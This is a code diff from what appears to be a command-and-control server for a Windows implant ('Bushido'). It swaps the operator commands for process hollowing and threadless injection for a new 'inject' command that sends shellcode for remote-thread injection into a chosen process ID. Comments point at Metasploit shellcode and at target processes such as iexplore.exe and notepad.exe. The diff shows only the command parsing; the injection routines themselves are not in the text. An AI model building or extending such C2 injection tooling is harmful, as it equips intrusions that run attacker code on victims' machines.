@@ -212,42 +212,22 @@ func openSession(id int, ll *SessionList) {
 				loadMatch := loadRegex.FindString(command)
 				cdRegex := regexp.MustCompile(`cd .+`)
 				cdMatch := cdRegex.FindString(command)
-				hollowRegex := regexp.MustCompile(`hollow .+ .+`)
-				hollowMatch := hollowRegex.FindString(command)
-				threadlessRegex := regexp.MustCompile(`threadless .+ .+`)
-				threadlessMatch := threadlessRegex.FindString(command)
+				remoteThreadRegex := regexp.MustCompile(`inject .+ .+`) //arg1 is the shelcode arg2 is the pid
+				remoteThreadMatch := remoteThreadRegex.FindString(command)
 				if cdMatch != "" {
 					dir2go := strings.Split(command, " ")[1]
 					cd(&current.Conn, dir2go)
 				}
-				// if playMatch != "" {//Not happy with this one
-				// 	audioFile := strings.Split(command, " ")[1]
-				// 	playAudio(&current.Conn, audioFile)
-				// }
+
 				if loadMatch != "" {
 					binFilePathLocal := strings.Split(command, " ")[1]
 					load(&current.Conn, binFilePathLocal)
 					fmt.Println()
 				}
-				if hollowMatch != "" {
-					filePathLocal := strings.Split(command, " ")[1]
-					//filePathTarget := strings.Split(command, " ")[2]
-					filePathTarget := strings.Split(command, "\"")[1]
-					//filePathTarget = "\"" + filePathTarget + "\"" //Not the sexiest fix but will do for now
-					fmt.Println()
-					fmt.Println("[!]Local File Path: " + filePathLocal)
-					fmt.Println("[!]Remote File Path: " + filePathTarget)
-					hollow(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
-					fmt.Println()
-				}
-				if threadlessMatch != "" {
-					//Try it with //threadless Bushido/msf.bin notepad.exe
-					filePathLocal := strings.Split(command, " ")[1]
-					remoteProcess := strings.Split(command, " ")[2]
-					fmt.Println()
-					fmt.Println("[!]Local File Path: " + filePathLocal)
-					fmt.Println("[!]Remote File Path: " + remoteProcess)
-					threadless(&current.Conn, filePathLocal, remoteProcess)
+				if remoteThreadMatch != "" {
+					binFilePathLocal := strings.Split(command, " ")[1]
+					targetPID := strings.Split(command, " ")[2]
+					remoteThread(&current.Conn, binFilePathLocal, targetPID)
 					fmt.Println()
 				}
 				switch command { //All of the functions called below will be found under bushido.go
@@ -278,6 +258,8 @@ func openSession(id int, ll *SessionList) {
 				//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
 				case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
 					fmt.Println("\n[?]Usage: load <pathTox64Shellcode>\n")
+				case "inject":
+					fmt.Println("\n[?]Usage: inject <pathToShellcode> <targetPID>")
 				case "cd":
 					fmt.Println("\n[?]Usage: cd <dir>\n") //Works with relative and absolute paths
 				case "ls":
